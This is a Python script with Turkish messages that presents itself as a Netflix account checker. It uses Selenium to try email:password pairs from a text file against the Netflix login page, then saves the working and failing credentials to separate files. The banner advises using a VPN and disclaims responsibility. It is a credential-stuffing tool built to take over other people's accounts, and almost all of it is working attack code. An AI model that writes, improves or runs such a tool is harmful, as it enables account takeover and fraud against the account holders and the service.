# MIT License
# 
# Copyright (c) 2025 elitares
# 
# İzin verildiği sürece, bu yazılımı ticari olmayan veya ticari amaçlar için kopyalayabilir, dağıtabilir ve değiştirebilirsiniz. Ancak, aşağıdaki koşulları yerine getirmeniz gerekmektedir:
# 1. Yazılımın orijinal lisansını ve telif hakkı bildirimlerini her kopyada veya önemli bir kısmında belirtmelisiniz.
# 2. Bu yazılımı, herhangi bir kötüye kullanım, zararlı faaliyet veya yasa dışı işler için kullanmamayı kabul ediyorsunuz.
# 3. Yazılımın değiştirilmiş sürümleri de bu lisans altında olmalıdır.
# 4. Yazar, yazılımı kullanmanın veya dağıtmanın sonuçlarından sorumlu değildir.

import subprocess
import sys
import mechanize
import time
import random
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

required_libraries = ['mechanize', 'selenium', 'webdriver_manager']

def install_libraries(libraries):
    for library in libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} kütüphanesi bulunamadı. Yükleniyor...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", library, '--break-system-packages'])

install_libraries(required_libraries)

def load_proxies():
    proxies = []
    try:
        with open("proxyler.txt", "r") as file:
            for line in file:
                proxies.append(line.strip())
        return proxies
    except FileNotFoundError:
        print("Proxy listesi 'proxyler.txt' dosyasında bulunamadı. Lütfen dosyayı ekleyin.")
        return []

def install_chrome_driver():
    chromedriver_dir = os.path.expanduser('~/bin')
    if not os.path.isdir(chromedriver_dir):
        os.makedirs(chromedriver_dir)

    if not os.path.isfile(f'{chromedriver_dir}/chromedriver'):
        print("ChromeDriver yüklü değil. Yükleniyor...")
        subprocess.check_call(["wget", "https://chromedriver.storage.googleapis.com/114.0.5735.90/chromedriver_linux64.zip", "-P", "/tmp"])
        subprocess.check_call(["unzip", "/tmp/chromedriver_linux64.zip", "-d", chromedriver_dir])
        subprocess.check_call(["chmod", "+x", f"{chromedriver_dir}/chromedriver"])
        print(f"ChromeDriver başarıyla {chromedriver_dir} dizinine yüklendi.")
    else:
        print("ChromeDriver zaten yüklü.")

    os.environ["PATH"] += os.pathsep + chromedriver_dir

print(""" 
 _____           _            _____ _               _             
|_   _|         | |          / ____| |             | |            
  | |  _ __ ___ | |__   __ _| |    | |__   ___  ___| | _____ _ __ 
  | | | '_ ` _ \| '_ \ / _` | |    | '_ \ / _ \/ __| |/ / _ \ '__|
 _| |_| | | | | | | | | (_| | |____| | | |  __/ (__|   <  __/ |   
|_____|_| |_| |_|_| |_|\__,_|\_____|_| |_|\___|\___|_|\_\___|_|   
                                2025  
                                version 0.0.1        
                                Coded by ravixR00T
                                                                        """)
print ('[#] Hesaplarinizi "hesaplistesi.txt" dosyasina e-posta ve sifre formatinda kaydedin [#]')
print ('[#] Format: e-posta:sifre (Her satırda bir hesap olacak) [#]')
print ('[#] Örnek: kullanici@mail.com:password123 [#]')
print ('[#] Hesaplarinizi hesaplistesi.txt icerisine yazin ve kaydedin, ardından bu dosyayi çalıştırın. [#]')
print ('[#] Vpn Kullanmayı Unutmayın [#]')
print ('[#] Sorumluluk Kabul Etmiyoruz [#]')
time.sleep(5)

contex = 0
contno = 0

accPass = []
accFail = []
outfile = open('calisanhesaplar.txt', 'w')
failfile = open('calismayanhesaplar.txt', 'w')

install_chrome_driver()

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

try:
    with open("hesaplistesi.txt", "r") as filestream:
        for line in filestream:
            driver.get('https://www.netflix.com/tr/login')
            currentline = line.split(':')
            print(f'currentline : {currentline}')

            time.sleep(3)

            email_field = driver.find_element(By.NAME, "userLoginId")
            password_field = driver.find_element(By.NAME, "password")

            email_field.send_keys(currentline[0])
            password_field.send_keys(currentline[1])

            password_field.send_keys(Keys.RETURN)

            time.sleep(5)

            if "browse" in driver.current_url:
                print("Hesap çalışıyor!")
                contex += 1
                driver.get('https://www.netflix.com/SignOut?lnkctr=mL')
                accPass.append(currentline[0] + ':' + currentline[1])
                time.sleep(2)
            else:
                print("Hesap çalışmıyor!")
                contno += 1
                accFail.append(currentline[0] + ':' + currentline[1])
                time.sleep(2)

    print('Çalışan hesaplar calisanhesaplar.txt dosyasına yazılıyor...')
    for all in accPass:
        outfile.write(str(all) + '\n')

    print('Çalışmayan hesaplar calismayanhesaplar.txt dosyasına yazılıyor...')
    for all in accFail:
        failfile.write(str(all) + '\n')

    if len(accPass) > 0 and len(accFail) > 0:
        with open("islem_durumu.txt", 'w') as status_file:
            status_file.write("İşlem Başarılı: Hem çalışan hem de çalışmayan hesaplar başarıyla kaydedildi.\n")
            print("İşlem başarılı, hesaplar kaydedildi.")
    else:
        with open("islem_durumu.txt", 'w') as status_file:
            status_file.write("İşlem Başarısız: Hesaplar kaydedilemedi.\n")
            print("İşlem başarısız, hesaplar kaydedilemedi.")

except Exception as e:
    print(f'Bir sorun oluştu: {e}. İlerleme kaydediliyor...')
    for all in accPass:
        outfile.write(str(all) + '\n')
    for all in accFail:
        failfile.write(str(all) + '\n')

    with open("islem_durumu.txt", 'w') as status_file:
        status_file.write(f"İşlem Başarısız: {e}\n") 
